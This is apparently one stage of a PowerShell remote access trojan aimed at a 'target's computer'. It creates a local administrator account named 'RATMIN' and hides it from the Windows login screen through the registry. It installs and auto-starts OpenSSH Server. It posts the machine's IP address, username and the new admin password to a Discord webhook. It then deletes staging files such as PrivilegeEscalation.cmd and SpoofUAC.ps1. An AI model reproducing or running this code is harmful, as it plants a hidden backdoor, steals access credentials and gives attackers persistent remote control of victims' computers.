# None of the files created will be saved on the target's computer
# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead

# Generate random password
function Generate-StrongPassword {
    # Generate a stronger password with at least one upper case letter, one lower case letter, one digit, and one special character.
    $specialCharacters = '!@#$%^&*()_+-=[]{}|;:,.<>?'
    $upperCaseLetters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    $lowerCaseLetters = 'abcdefghijklmnopqrstuvwxyz'
    $numbers = '0123456789'

    $password = Get-Random -InputObject ($upperCaseLetters + $lowerCaseLetters + $numbers + $specialCharacters) -Count 12
    return -join $password
}

function Create-LocalAdminUser {
    [CmdletBinding()]
    param (
        [string] $Username,
        [securestring] $Password
    )    
    begin {
    }    
    process {
        New-LocalUser -Name $Username -Password $Password -FullName $Username -Description "Temporary local admin"
        Write-Verbose "$Username local user created"
        Add-LocalGroupMember -Group "Administrators" -Member $Username
        Write-Verbose "$Username added to the local administrator group"
    }    
    end {
    }
}

$Username = "RATMIN"
$Password = Generate-StrongPassword
Remove-LocalUser -Name $Username
$SecurePassword = (ConvertTo-SecureString $Password -AsPlainText -Force)
Create-LocalAdminUser -Username $Username -Password $SecurePassword

$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$RegistryValue = '00000000'

New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $RegistryPath -Name $Username -Value $RegistryValue -PropertyType DWORD -Force

# Install the OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the sshd service
Start-Service sshd

# Set the sshd service to start automatically
Set-Service -Name sshd -StartupType "Automatic"

# Get IPv4 address of the machine
$IPAddressString = "IPv4 Address"
# Uncomment the following line when using older versions of Windows without IPv6 support
# $IPAddressString = "IP Address"
$IPconfigOutput = ipconfig
$IPAddress = $IPconfigOutput | Select-String -Pattern $IPAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1

# Get the current user's username
$Username = $env:USERNAME

# Get the user's profile folder
$UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Define the path to the file containing the Discord webhook URL
$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.icu"
# Use Get-Content to read the file and store its content in a variable
$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile

# Create a text file in the user's startup folder
$TextContent = "$IPAddress`n$Username`n$Password"
$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
$TextContent | Out-File -FilePath $TextFile

# Define a message (commented out for now)
# $Message = "Message Placeholder"

# Create a multipart form-data payload
$Boundary = [System.Guid]::NewGuid().ToString()
$CRLF = "`r`n"
$Payload = "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
    "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$Username.txt`"$CRLF" +
    "Content-Type: application/octet-stream$CRLF$CRLF" +
    (Get-Content -Path $TextFile) + $CRLF +
    "--$Boundary--"
# Set the headers for the request
$Headers = @{
    "Content-Type" = "multipart/form-data; boundary=$Boundary"
}

# Send the payload to Discord
Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload

# Delete the text file
Remove-Item -Path $TextFile

$PrivilegeEscalationFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\PrivilegeEscalation.cmd"
Remove-Item -Path $PrivilegeEscalationFilePath

$DiscordWebhookURLFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\DiscordWebhookURL.icu"
Remove-Item -Path $DiscordWebhookURLFilePath

$EstablishConnectionFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\EstablishConnection.ps1"
Remove-Item -Path $EstablishConnectionFilePath

$SpoofUACFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\SpoofUAC.ps1"
Remove-Item -Path $SpoofUACFilePath